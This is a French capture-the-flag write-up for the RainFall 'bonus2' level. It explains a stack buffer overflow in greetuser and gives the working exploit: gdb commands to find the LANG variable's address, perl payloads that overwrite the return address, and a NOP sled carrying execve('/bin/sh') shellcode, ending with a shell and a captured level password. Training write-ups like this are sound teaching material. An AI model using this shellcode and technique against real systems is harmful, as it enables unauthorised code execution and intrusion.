# bonus2

Le main copie notre premier argument dans `dest` puis notre 2ème argument à l'index `40` de `dest`

Ensuite, le programme check la valeur de notre variable d'environement `LANG` pour définir la variable `langage`, puis appelle `greetuser` avec `v4` en argument (qui contient une copie de `dest`)

`greetuser` contient également un `char[80] dest` dans lequel il va commencer par copier un message de bienvenue en fonction du langage

Il va ensuite concaténer `src` (le string passé en paramètre) à `dest` et afficher le tout avec `puts`.

L'idée ici va être de mettre un shellcode dans une variable d'environement puis d'overflow le `dest` de `greetuser` avec l'adresse de cette variable pour lui faire exécuter le shellcode.

Notre shellcode sera dans notre variable d'environement `LANG` à la suite de la langue choisie, on va utiliser `nl` car c'est celui qui nous ajoutera le plus de caractères dans notre buffer ("Goedemiddag! " = 13 charactères)

L'adresse de notre variable sera récupérée avec gdb, vu que l'environement de gdb diffère légèrement de notre environement de base, on va ajouter un grand nombre de NOP avant le shellcode pour être sur de taper dessus

On va commencer par donner une valeur de test à notre variable lang pour déterminer son adresse facilement

```bash
LANG="testtesttest"
gdb ./bonus2"

(gdb) x/s *((char **)environ)
0xbffff91d:	 "SHELL=/bin/bash"
(gdb) x/20s *((char **)environ)
0xbffff91d:	 "SHELL=/bin/bash"
0xbffff92d:	 "TERM=xterm-256color"
0xbffff941:	 "SSH_CLIENT=10.0.2.2 59618 4242"
0xbffff960:	 "SSH_TTY=/dev/pts/0"
0xbffff973:	 "USER=bonus2"
0xbffff97f:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffffa47:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbffffb0f:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffbd7:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xbffffc9f:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
0xbffffd67:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
---Type <return> to continue, or q <return> to quit---
0xbffffe2f:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xbffffea0:	 "COLUMNS=80"
0xbffffeab:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffef8:	 "MAIL=/var/mail/bonus2"
0xbfffff0e:	 "_=/usr/bin/gdb"
0xbfffff1d:	 "PWD=/home/user/bonus2"
0xbfffff33:	 "LANG=testtesttest"
0xbfffff3d:	 "LINES=24"
0xbfffff46:	 "HOME=/home/user/bonus2"
```

On trouve notre variable à l'adresse `0xbfffff33`



On va à présent commencer à fabriquer noter payload en remplissant le `dest` du main, d'abord la première partie avec 40 lettres:

```bash
echo $(perl -e 'print "A"x40;') > /tmp/payload1
```

puis la seconde avec 23 lettre + l'adresse de notre variable d'environement (= 27 bytes, + les 13 de notre message de bienvenue = 40 bytes, ce qui complète notre offset de 80)

```bash
echo $(perl -e 'print "B"x23 . "\x33\xff\xff\xbf";') > /tmp/payload2
```

On finir par donner la bonne valeur à noter variable `LANG` avec le langage `nl` suivit de beaucoup de NOP puis de notre shellcode

```bash
LANG=$(perl -e 'print "nl" . "\x90"x10000 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";')
```

Puis on n'a plus qu'à lancer le programme avec notre payload complet 

```bash
bonus2@RainFall:~$ ./bonus2 $(cat /tmp/payload1) $(cat /tmp/payload2)
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBp���
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
